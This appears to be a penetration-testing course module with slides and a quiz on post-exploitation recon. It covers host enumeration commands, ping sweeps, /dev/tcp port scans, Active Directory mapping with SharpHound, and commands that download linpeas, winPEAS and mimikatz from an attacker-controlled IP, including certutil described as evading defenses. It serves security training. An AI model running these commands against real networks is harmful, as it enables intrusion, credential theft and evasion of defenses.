title: Situational Awareness & Internal Enumeration 🔍
description: Map the compromised host and discover other systems on the network.

slides.title: Know Your Host 🖥️
slides.content:
# The First 60 Seconds

After getting a shell, immediately gather basic situational awareness. This information determines your next move.

**Linux Commands:**
```bash
whoami && id                 # Who am I?
hostname && uname -a         # System name and kernel version
ip addr show && ip route     # Network interfaces and routing
netstat -tulpn               # Listening services and connections
ps aux                       # Running processes (look for AV/EDR!)
cat /etc/passwd              # Local users
cat /etc/*-release           # OS distribution
```

**Windows Commands:**
```cmd
whoami /all                  # User and privileges
hostname && systeminfo       # System info and hotfixes
ipconfig /all && route print # Network config
netstat -ano                 # Connections and listening ports
tasklist /svc                # Processes with services
net user && net localgroup   # Local users and groups
```

quizData.question: You run `netstat -ano` on a Windows host and see multiple established connections to `10.0.0.50:389`. What does this likely indicate?

options.text: The host is a web server.
The host is connected to a Domain Controller (LDAP).
The host is infected with malware.
The host is a print server.

quizData.explanation: Port 389 is LDAP, typically used for Active Directory communication. This host is likely domain-joined.

slides.title: Discovering the Internal Network 🌐
slides.content:
# Mapping the Terrain

From your compromised host, you now have a **new perspective**: the internal network. This is where the real treasure lies.

**Passive Discovery (No packets sent):**
- **Check ARP Cache**: `arp -a` (Shows recently contacted hosts).
- **Check Netstat Connections**: `netstat -an` (Shows active connections to other servers).
- **Check DNS Cache**: `ipconfig /displaydns` (Windows) or check `/etc/hosts`.

**Active Discovery (Gentle Probing):**
- **Ping Sweep (Linux)**: `for i in {1..254}; do (ping -c 1 10.0.0.$i | grep "bytes from" &); done`
- **Ping Sweep (PowerShell)**: `1..254 | % { Test-Connection 10.0.0.$_ -Count 1 -Quiet }`
- **Port Scan (Limited)**: Scan only specific ports (445 SMB, 22 SSH, 3389 RDP) on discovered hosts.

**Tool Transfer**: You'll want to bring tools like `nmap` or `chisel` onto the host. Use `wget`, `curl`, `certutil`, or base64 encoding.

slides.title: Transferring Files to the Target 📦
slides.content: Getting your tools onto the compromised host without SMB or FTP.
slides.codeSnippet:
# Linux: wget or curl
wget http://192.168.56.102:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://192.168.56.102:8000/nmap -o /tmp/nmap

# Windows: certutil (built-in, evades some defenses)
certutil -urlcache -split -f http://192.168.56.102:8000/winPEAS.exe C:\Users\Public\winPEAS.exe

# Windows: PowerShell
Invoke-WebRequest -Uri http://192.168.56.102:8000/mimikatz.exe -OutFile mimikatz.exe

# Base64 Encoding (Paste file content directly)
# On Kali: base64 -w 0 nmap > nmap.b64
# On Target: echo "BASE64_STRING" | base64 -d > nmap

slides.title: Active Directory Enumeration 🏢
slides.content:
# Domain Dominance Recon

If the host is Windows and domain-joined, you need to map Active Directory.

**Essential AD Recon Commands (No Admin Required):**
```powershell
# Get Domain Info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Get Domain Controllers
nltest /dclist:domain.local

# Get Domain Users and Groups
net user /domain
net group "Domain Admins" /domain

# BloodHound (The Ultimate AD Mapper)
# Upload SharpHound.exe and run:
SharpHound.exe -c All
# Download the .zip file and analyze in BloodHound GUI on Kali.
```

**BloodHound** visualizes attack paths to Domain Admin. It is the **single most important** tool for AD post-exploitation.

slides.title: Pro Tip: Living Off the Land 🚀
slides.content:
## Use What's Already There

Transferring `nmap.exe` triggers antivirus. Instead, use **native tools**:
- **PowerShell Port Scan**: `Test-NetConnection 10.0.0.50 -Port 445`
- **Linux**: `for p in {1..65535}; do (echo >/dev/tcp/10.0.0.50/$p) >/dev/null 2>&1 && echo "$p open"; done`
- **Windows Netstat**: Check existing connections to find other servers (`netstat -an | findstr ESTABLISHED`).
